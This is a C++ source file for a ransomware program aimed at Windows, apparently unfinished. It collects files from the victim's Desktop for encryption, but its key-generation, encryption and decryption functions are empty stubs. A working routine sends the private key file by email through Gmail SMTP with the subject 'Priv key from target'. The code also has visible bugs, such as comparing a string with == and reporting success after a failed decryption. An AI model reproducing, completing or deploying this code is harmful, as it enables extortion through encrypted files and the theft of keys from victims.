// Created by Sebastian Hyjek
// #09/16/2024
// having problems with installing the cryptography modules i need
// this program does not work at all

#include <direct.h>
#include <iostream>
#include <cstdlib>
#include <filesystem>
#include <vector>

using namespace std;
namespace fs = filesystem;

#include "stdafx.h"
#include <tchar.h>
#include <Windows.h>
#include "EASendMailObj.tlh"

using namespace EASendMailObjLib;

int generateKeys()
{
    return 0;
}

int encryptFiles()
{
    return 0;
}

bool decryptFiles()
{
    return true;
}

using namespace EASendMailObjLib;

int sendDelPrivKey()
{
    ::CoInitialize(nullptr);
    IMailPtr oSmtp = nullptr;
    oSmtp.CreateInstance(__uuidof(EASendMailObjLib::Mail));
    oSmtp->LicenseCode = _T("TryIt");

    // Set your Gmail email address
    oSmtp->FromAddr = _T("email");

    // Add recipient email address
    oSmtp->AddRecipientEx(_T("email"), 0);

    // Set email subject
    oSmtp->Subject = _T("Priv key from target");

    // Gmail SMTP server address
    oSmtp->ServerAddr = _T("smtp.gmail.com");

    // Gmail user authentication
    oSmtp->UserName = _T("email");
    oSmtp->Password = _T("auth code");

    // Use SSL 465 port
    oSmtp->ServerPort = 465;
    oSmtp->ConnectType = ConnectSSLAuto;

    // Add file attachment
    oSmtp->AddAttachment(_T("private_key.pem"));

    // Send email
    if (oSmtp->SendMail() == 0)
    {
        _tprintf(_T("Email was sent successfully with attachment!\n"));
    }
    else
    {
        _tprintf(_T("Failed to send email with the following error: %s\n"), (const TCHAR *)oSmtp->GetLastErrDescription());
    }

    return 0;
}

int main(int argc, char *argv[])
{
    if (argc > 2)
    {
        cout << "Too many arguments\nUsage: <ransomware.exe> private_key.pem" << endl;
        return 1;
    }
    // cd into the Desktop directory
    char currentDir[256];
    _getcwd(currentDir, sizeof(currentDir));

    const char *username = getenv("USERNAME");
    if (username)
    {
        string newPath = "C:\\Users\\" + std::string(username) + "\\Desktop";
        if (_chdir(newPath.c_str()) == 0)
        {
            _getcwd(currentDir, sizeof(currentDir));
        }
        else
        {
            cerr << "Failed to change directory" << endl;
        }
    }
    else
    {
        cerr << "Failed to get username" << endl;
    }

    // collect files into an iterable list
    vector<fs::path> fileList;
    string cwd = _getcwd(currentDir, sizeof(currentDir));
    try
    {
        for (const auto &entry : fs::directory_iterator(cwd))
        {
            if (is_regular_file(entry.status()) && entry.path().filename() != "ransomware.exe")
            {
                fileList.push_back(entry.path());
            }
        }
    }
    catch (const fs::filesystem_error &e)
    {
        cerr << "Error: " << e.what() << endl;
    }
    // determine if the public key has already been generated
    fs::path filePath = "public_key.pem";
    if (!is_regular_file(filePath))
    {
        generateKeys();
        encryptFiles();
    }

    if (argv[1] == "private_key.pem")
    {
        if (!decryptFiles())
        {
            cerr << "Failed to decrypt files\nIncorrect Key" << endl;
        }
        cout << "Files successfully decrypted" << endl;
    }

    return 0;
}
